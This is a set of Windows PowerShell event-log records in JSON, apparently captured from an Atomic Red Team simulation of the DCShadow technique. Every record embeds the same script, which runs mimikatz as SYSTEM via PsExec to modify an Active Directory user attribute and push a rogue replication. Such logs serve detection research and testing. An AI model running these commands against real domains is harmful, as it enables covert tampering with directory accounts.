{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:34:00.2344637"},"EventRecordID":"1094","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=3f6117d9-b706-44ea-aea4-cee88b8251cd\r\n\tHostApplication=powershell.exe &amp; {# starting fake DC server, as SYSTEM (required)\r\n$dc_output_file = \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\" `\"exit`\"\"\r\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PSTools\\PsExec.exe' /accepteula -d -s C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe $mimikatzParam\"\r\n\r\n# wait for fake DC server to be ready...\r\nStart-Sleep -Seconds 5\r\n\r\n# server ready, so trigger replication (push) and wait until it finished\r\n&amp; \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe\" \"lsadump::dcshadow /push\" \"exit\"\r\n\r\nWrite-Host \"`nWaiting for fake DC server to return\"\r\nWait-Process $dc\r\n\r\nWrite-Host \"`nOutput from fake DC server:\"\r\nGet-Content $dc_output_file\r\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n\r\nWrite-Host \"End of DCShadow\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:34:00.2344637"},"EventRecordID":"1095","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=3f6117d9-b706-44ea-aea4-cee88b8251cd\r\n\tHostApplication=powershell.exe &amp; {# starting fake DC server, as SYSTEM (required)\r\n$dc_output_file = \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\" `\"exit`\"\"\r\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PSTools\\PsExec.exe' /accepteula -d -s C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe $mimikatzParam\"\r\n\r\n# wait for fake DC server to be ready...\r\nStart-Sleep -Seconds 5\r\n\r\n# server ready, so trigger replication (push) and wait until it finished\r\n&amp; \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe\" \"lsadump::dcshadow /push\" \"exit\"\r\n\r\nWrite-Host \"`nWaiting for fake DC server to return\"\r\nWait-Process $dc\r\n\r\nWrite-Host \"`nOutput from fake DC server:\"\r\nGet-Content $dc_output_file\r\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n\r\nWrite-Host \"End of DCShadow\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:34:00.2344637"},"EventRecordID":"1096","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=3f6117d9-b706-44ea-aea4-cee88b8251cd\r\n\tHostApplication=powershell.exe &amp; {# starting fake DC server, as SYSTEM (required)\r\n$dc_output_file = \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\" `\"exit`\"\"\r\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PSTools\\PsExec.exe' /accepteula -d -s C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe $mimikatzParam\"\r\n\r\n# wait for fake DC server to be ready...\r\nStart-Sleep -Seconds 5\r\n\r\n# server ready, so trigger replication (push) and wait until it finished\r\n&amp; \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe\" \"lsadump::dcshadow /push\" \"exit\"\r\n\r\nWrite-Host \"`nWaiting for fake DC server to return\"\r\nWait-Process $dc\r\n\r\nWrite-Host \"`nOutput from fake DC server:\"\r\nGet-Content $dc_output_file\r\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n\r\nWrite-Host \"End of DCShadow\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:34:00.2525960"},"EventRecordID":"1097","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=3f6117d9-b706-44ea-aea4-cee88b8251cd\r\n\tHostApplication=powershell.exe &amp; {# starting fake DC server, as SYSTEM (required)\r\n$dc_output_file = \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\" `\"exit`\"\"\r\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PSTools\\PsExec.exe' /accepteula -d -s C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe $mimikatzParam\"\r\n\r\n# wait for fake DC server to be ready...\r\nStart-Sleep -Seconds 5\r\n\r\n# server ready, so trigger replication (push) and wait until it finished\r\n&amp; \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe\" \"lsadump::dcshadow /push\" \"exit\"\r\n\r\nWrite-Host \"`nWaiting for fake DC server to return\"\r\nWait-Process $dc\r\n\r\nWrite-Host \"`nOutput from fake DC server:\"\r\nGet-Content $dc_output_file\r\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n\r\nWrite-Host \"End of DCShadow\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:34:00.2525960"},"EventRecordID":"1098","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=3f6117d9-b706-44ea-aea4-cee88b8251cd\r\n\tHostApplication=powershell.exe &amp; {# starting fake DC server, as SYSTEM (required)\r\n$dc_output_file = \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\" `\"exit`\"\"\r\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PSTools\\PsExec.exe' /accepteula -d -s C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe $mimikatzParam\"\r\n\r\n# wait for fake DC server to be ready...\r\nStart-Sleep -Seconds 5\r\n\r\n# server ready, so trigger replication (push) and wait until it finished\r\n&amp; \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe\" \"lsadump::dcshadow /push\" \"exit\"\r\n\r\nWrite-Host \"`nWaiting for fake DC server to return\"\r\nWait-Process $dc\r\n\r\nWrite-Host \"`nOutput from fake DC server:\"\r\nGet-Content $dc_output_file\r\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n\r\nWrite-Host \"End of DCShadow\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:34:00.2643913"},"EventRecordID":"1099","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=3f6117d9-b706-44ea-aea4-cee88b8251cd\r\n\tHostApplication=powershell.exe &amp; {# starting fake DC server, as SYSTEM (required)\r\n$dc_output_file = \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\" `\"exit`\"\"\r\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PSTools\\PsExec.exe' /accepteula -d -s C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe $mimikatzParam\"\r\n\r\n# wait for fake DC server to be ready...\r\nStart-Sleep -Seconds 5\r\n\r\n# server ready, so trigger replication (push) and wait until it finished\r\n&amp; \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe\" \"lsadump::dcshadow /push\" \"exit\"\r\n\r\nWrite-Host \"`nWaiting for fake DC server to return\"\r\nWait-Process $dc\r\n\r\nWrite-Host \"`nOutput from fake DC server:\"\r\nGet-Content $dc_output_file\r\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n\r\nWrite-Host \"End of DCShadow\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:34:00.4576036"},"EventRecordID":"1100","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=3f6117d9-b706-44ea-aea4-cee88b8251cd\r\n\tHostApplication=powershell.exe &amp; {# starting fake DC server, as SYSTEM (required)\r\n$dc_output_file = \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\" `\"exit`\"\"\r\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PSTools\\PsExec.exe' /accepteula -d -s C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe $mimikatzParam\"\r\n\r\n# wait for fake DC server to be ready...\r\nStart-Sleep -Seconds 5\r\n\r\n# server ready, so trigger replication (push) and wait until it finished\r\n&amp; \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe\" \"lsadump::dcshadow /push\" \"exit\"\r\n\r\nWrite-Host \"`nWaiting for fake DC server to return\"\r\nWait-Process $dc\r\n\r\nWrite-Host \"`nOutput from fake DC server:\"\r\nGet-Content $dc_output_file\r\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n\r\nWrite-Host \"End of DCShadow\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=6d062bbc-9537-4104-b4d1-6fce49c6a4a7\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 18:34:08.2659154"},"EventRecordID":"1101","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=3f6117d9-b706-44ea-aea4-cee88b8251cd\r\n\tHostApplication=powershell.exe &amp; {# starting fake DC server, as SYSTEM (required)\r\n$dc_output_file = \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`\" `\"exit`\"\"\r\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PSTools\\PsExec.exe' /accepteula -d -s C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe $mimikatzParam\"\r\n\r\n# wait for fake DC server to be ready...\r\nStart-Sleep -Seconds 5\r\n\r\n# server ready, so trigger replication (push) and wait until it finished\r\n&amp; \"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe\" \"lsadump::dcshadow /push\" \"exit\"\r\n\r\nWrite-Host \"`nWaiting for fake DC server to return\"\r\nWait-Process $dc\r\n\r\nWrite-Host \"`nOutput from fake DC server:\"\r\nGet-Content $dc_output_file\r\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\r\nRemove-Item $dc_output_file -ErrorAction Ignore\r\n\r\nWrite-Host \"End of DCShadow\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=6d062bbc-9537-4104-b4d1-6fce49c6a4a7\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
